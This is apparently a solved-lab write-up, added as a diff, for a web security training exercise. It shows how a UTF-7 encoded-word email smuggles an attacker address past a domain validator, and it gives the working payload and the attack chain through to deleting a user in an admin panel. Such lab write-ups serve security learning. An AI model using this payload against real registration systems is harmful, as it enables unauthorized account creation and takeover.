@@ -1,0 +1,40 @@
+Lab: Bypassing access controls using email address parsing discrepancies (EXPERT)
+Status: SOLVED
+
+## Vulnerability
+Business logic flaw in email domain validation. The application restricts registration to @ginandjuice.shop emails, but there is a parser discrepancy between the domain validator and the underlying mail library.
+
+## Exploit
+The validator checks the raw email string for @ginandjuice.shop, but the mail library decodes RFC 2047 encoded-words (specifically UTF-7/IMAP modified UTF-7) before determining the delivery address.
+
+Payload: =?utf-7?q?attacker&AEA-exploit-server.net&ACA-?=@ginandjuice.shop
+
+Where:
+- &AEA- decodes to @ in IMAP modified UTF-7
+- &ACA- decodes to space
+- The validator sees @ginandjuice.shop at the end (passes domain check)
+- The mail library decodes to "attacker@exploit-server.net " and routes the email there
+- ISO-8859-1 and UTF-8 encoded-words are detected and blocked, but UTF-7 is not
+
+## Attack Chain
+1. Registered with crafted UTF-7 encoded email
+2. Confirmation email was sent to exploit server email client
+3. Retrieved registration token from exploit server inbox
+4. Confirmed account via token link
+5. Logged in with registered credentials
+6. Accessed admin panel at /admin
+7. Deleted carlos via /admin/delete?username=carlos
+
+## Key Findings
+- Non-ginandjuice.shop emails: blocked with "Only emails with the ginandjuice.shop domain are allowed"
+- ISO-8859-1 encoded-word: blocked with "Registration blocked for security reasons"
+- UTF-8 encoded-word: blocked with "Registration blocked for security reasons"
+- UTF-7 encoded-word: PASSES validation (no security check for UTF-7)
+- Standard UTF-7 (+AEA- for @): passes validation but doesn't redirect email delivery
+- IMAP modified UTF-7 (&AEA- for @): passes validation AND redirects email to attacker domain
+
+## Scripts Created
+- explore.py: Initial application reconnaissance
+- exploit.py-exploit7.py: Progressive exploitation attempts
+- exploit8.py: Successful UTF-7 IMAP exploit (email received)
+- solve5.py: Complete end-to-end exploit (register -> confirm -> login -> admin -> delete)
